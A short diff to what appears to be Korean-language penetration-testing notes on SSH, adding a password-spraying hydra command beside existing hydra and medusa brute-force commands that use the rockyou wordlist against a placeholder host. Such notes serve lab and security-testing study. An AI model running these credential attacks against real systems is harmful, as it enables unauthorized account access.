@@ -40,6 +40,9 @@ SSH는 Windows 서버에도 사용될 수 있다.
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
 hydra -L users.txt -P passwords.txt ssh://<IP> -t 4 -vV
 
+# 패스워드 스프레잉
+hydra -L users.txt -p '<비밀번호>' ssh://<IP> -t 1
+
 # medusa
 medusa -h <IP> -u root -P rockyou.txt -M ssh
 
